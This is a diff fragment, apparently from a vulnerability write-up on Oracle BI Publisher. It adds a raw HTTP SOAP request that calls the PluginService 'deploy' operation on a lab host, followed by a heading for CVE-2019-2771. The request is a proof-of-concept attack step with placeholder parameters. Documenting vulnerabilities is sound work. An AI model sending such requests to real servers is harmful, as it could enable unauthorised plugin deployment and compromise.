@@ -48,7 +48,31 @@ Content-Length: 610
 </soapenv:Envelope>
 
 ```
+```
+POST /xmlpserver/services/v2/PluginService HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.204.179:9502/xmlpserver/services
+Upgrade-Insecure-Requests: 1
+SOAPAction: 
+Content-Type: text/xml;charset=UTF-8
+Host: 192.168.204.179:9502
+Content-Length: 431
 
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:v2="http://xmlns.oracle.com/oxp/service/v2">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <v2:deploy>
+         <v2:sessionToken>-1626402211</v2:sessionToken>
+         <v2:appPath>0</v2:appPath>
+         <v2:pluginName>1</v2:pluginName>
+         <v2:uploadedData>2</v2:uploadedData>
+      </v2:deploy>
+   </soapenv:Body>
+</soapenv:Envelope>
+```
 
 ## CVE-2019-2771
  * Subject: BIP BYPASS FONT UPLOAD
